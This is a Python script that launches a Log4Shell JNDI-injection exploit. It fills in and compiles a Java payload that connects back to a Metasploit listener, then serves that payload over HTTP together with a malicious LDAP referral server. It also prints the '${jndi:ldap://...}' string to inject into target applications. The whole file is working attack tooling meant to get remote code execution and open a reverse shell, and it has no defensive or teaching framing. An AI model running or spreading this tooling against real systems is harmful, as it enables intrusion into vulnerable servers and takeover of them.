import argparse
import subprocess
import sys
import os
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler


def check_if_installed(prog):
    try:
        result = subprocess.call([prog, '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except Exception as ex:
        result = -1
    finally:
        if result != 0:
            print(f'{prog} is not installed...exiting')
            sys.exit(1)

def ensure_dir_exists(dir_name):
    if os.path.isdir(dir_name):
        return
    try:
        os.mkdir(dir_name)
    except Exception as ex:
        print(f'Error unable to create dir : {dir_name} .......exiting')
        sys.exit(1)

def ensure_l4sutils_are_built(jar_file):
    if os.path.isfile(jar_file):
        return 
    print("building l4sutils.jar...this may take a few minutes")
    subprocess.call(["sh", "-c", "./build_l4sutils.sh"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    print("just returned from calling build_l4sutils.sh")
    if not os.path.isfile(jar_file):
        # if here then the build failed
        print("executing build_l4sutils.sh failed.....exiting")
        sys.exit(1)
                
def run_mini_met(http_ip, http_port, msf_ip, msf_port, ldap_port):
    f = "MiniMet"

    check_if_installed("java")
    check_if_installed("javac")
    check_if_installed("mvn")

    # writing the exploit to Exploit.java file
    try:
        ensure_dir_exists("build_tmp")
        ensure_dir_exists("wwwroot")

        with open(f'exploits/{f}.java', "r") as template:
            source = template.read().replace("<MSF_IP>", msf_ip).replace("<MSF_PORT>", str(msf_port))
    
        with open(f'build_tmp/{f}.java', "w+") as dest:
            dest.write(str(source))
       
        print(f'{f} java file created success')
        subprocess.run(["javac", "-d", "wwwroot", f'build_tmp/{f}.java'])
        print("Just complied payload")
    except Exception as e:
        print(f'Something went wrong {e.__str__()}')

    print('Setting up the LDAP and web server.', end="\n\n")
    # create the LDAP server on new thread
    t1 = threading.Thread(target=create_ldap_server, args=(ldap_port, http_ip, http_port, f))
    t1.start()
    
    class Handler(SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory="wwwroot", **kwargs)

    # start the web server
    with HTTPServer(('0.0.0.0', int(http_port)), Handler) as httpd:
        print(f'started http server on port {http_port}')
        httpd.serve_forever()


def create_ldap_server(ldap_port, http_ip, http_port, f):
    jar_file =  "l4sutils/target/l4sutils-0.1-all.jar"
    ensure_l4sutils_are_built(jar_file)
    print("---------------------------")
    print('${jndi:ldap://%s:%s/#%s}' % (http_ip, ldap_port, f))
    print("---------------------------")

    url = f"http://{http_ip}:{http_port}/"
    subprocess.run(["java", "-jar", jar_file, url, str(ldap_port)])

if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(
                description='please enter the values ')
        
        parser.add_argument('--ldap_port', metavar='ldap_port', type=int,
                help='listener port for LDAP server', default=1389)

        parser.add_argument('--http_ip', metavar='http_ip', type=str,
                help='Enter IP for HTTP server')

        parser.add_argument('--http_port', metavar='http_port', type=int,
                help='listener port for HTTP port')

        parser.add_argument('--msf_ip', metavar='msf_ip', type=str,
                help='MSFConsole ip address')

        parser.add_argument('--msf_port', metavar='msf_port', type=int,
                help='MSFConsole listener port')

        args = parser.parse_args()
        print("about to start.....")
        run_mini_met(args.http_ip, args.http_port, args.msf_ip, args.msf_port, args.ldap_port)
    except KeyboardInterrupt:
        print("[EXIT] User interrupted the program.")
        sys.exit(0)
